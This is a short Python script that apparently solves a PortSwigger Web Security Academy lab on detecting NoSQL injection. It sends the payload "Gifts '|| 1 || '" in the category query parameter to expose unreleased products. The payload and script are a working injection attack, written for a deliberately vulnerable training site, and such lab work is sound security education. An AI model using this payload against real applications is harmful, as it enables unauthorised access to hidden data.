#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 29/9/2023
#
# Lab: Detecting NoSQL injection
#
# Steps: 1. Inject payload into "category" query parameter to retrieve
#           unreleased products
#        2. Observe unreleased products in the response
#
#########################################################################################

###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########
# change this to your lab URL
url = "https://0a4d00a9038b8e3c8423a098007a004b.web-security-academy.net"

print(Fore.BLUE + "❯ Injection parameter: " + Fore.YELLOW + "category")

# payload to retrieve unreleased products
payload = f"Gifts '|| 1 || '"

try:  # inj
    injection = requests.get(f"{url}/filter?category={payload}")
    # if the response is OK and unreleased products is retrieved
    if injection.status_code == 200:
        print(
            Fore.WHITE + "❯ Injecting payload to retrieve unreleased products.. " + Fore.GREEN + "OK")
        print(
            Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
except:
    print(
        Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
